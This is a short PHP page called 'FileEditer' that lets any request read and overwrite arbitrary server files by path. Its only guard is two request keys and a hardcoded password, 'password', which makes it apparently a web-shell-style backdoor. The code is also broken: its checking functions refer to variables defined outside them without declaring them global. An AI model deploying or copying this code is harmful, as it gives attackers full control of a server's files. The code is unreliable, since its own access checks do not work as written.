<?php
$custom_check_key = [ 'faa', 'adminflg' ];
$password = 'password';

function checkKey(){
	foreach($custom_check_key as $key)
		if(!isset($_REQUEST[$key]))
			return false;
	return true;
}

function checkPassword(){
	if(!isset($_REQUEST['password']))
		return false;
	if(!is_string($_REQUEST['password']))
		return false;
	return password_verify($_REQUEST['password'], password_hash($password, PASSWORD_DEFAULT));
}

function save(){
	if(!checkKey() || !checkPassword())
		return;
	if(!isset($_REQUEST['save']))
		return;
	if(!isset($_REQUEST['file']) || !isset($_REQUEST['content']))
		return;
	file_put_contents($_REQUEST['file'], $_REQUEST['content']);
}

save();

?>
<html>
	<head>
		<title>FileEditer</title>
	</head>
	<body>
		<?php if(checkKey() && checkPassword() && isset($_REQUEST['file']) && is_string($_REQUEST['file'])) : ?>
		<form method="post" action="firefileediter.php">
			<input name="file" type="text" value="<?php print(htmlspecialchars($_REQUEST['file'])); ?>">
			<textarea name="content"><?php if(file_exists($_REQUEST['file'])) print(htmlspecialchars(file_get_contents($_REQUEST['file']))); ?></textarea>
			<input name="save" type="submit" value="Save">
		</form>
		<?php endif; ?>
	</body>
</html>
